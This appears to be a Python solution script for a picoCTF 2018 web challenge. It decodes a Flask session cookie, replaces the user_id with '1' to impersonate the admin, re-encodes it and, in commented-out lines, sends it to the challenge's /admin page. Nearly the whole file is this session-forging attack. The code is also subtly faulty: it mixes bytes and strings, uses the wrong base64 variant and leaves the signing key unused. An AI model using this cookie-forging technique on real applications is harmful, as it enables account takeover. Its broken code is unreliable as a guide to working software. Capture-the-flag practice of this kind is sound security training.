#coding=utf-8
import base64
import zlib
import requests
import json

KEY='06f4eefabf03b8f4e521fbdada13f65c'
session='.eJwlj0tqA0EMBe_Say_6I7UkX2bQr4kxJDBjr0Lu7oasalXFe7_lWGdeX-X-Ot95K8cjyr3wCpwi5jURQHolVMI6KgaQKYeGGbs0xWmGc6wMUl9LARuNFplNxzDV5t0IWjVW6NBRxqoGW-oMsklMocM7JK6kVqW22qPcil_nOl4_z_zee9AZvZrt-nDpM0Z3QSQZLZmdrZMAM27vfeX5f2KWvw-vFz4r.DyQfmw.-qu21n_XZQzbtUX62_RDv5D__vY'
#改成base64編碼
session=session.split('.')[1]
data=session+b'='*(4-(len(session)%4))
#轉碼
data=base64.urlsafe_b64decode(data)
#解壓縮
data=zlib.decompress(data)

json_data=json.loads(data)

raw='{"_fresh":true,"_id":"'+json_data['_id']+'","csrf_token":"'+json_data['csrf_token']+'","user_id":"1"}'

encrypted=zlib.compress(raw)
encrypted=base64.b64encode(encrypted)
encrypted+=b'='*(4-len(encrypted)%4)
encrypted='.'+encrypted
encrypted=encrypted.split('=')[0]

cookie=dict(session=encrypted)
print(cookie)

# r=requests.get('http://2018shell3.picoctf.com:5953/admin', cookies=cookie)
# result=r.content.decode('big5')
# print(result)
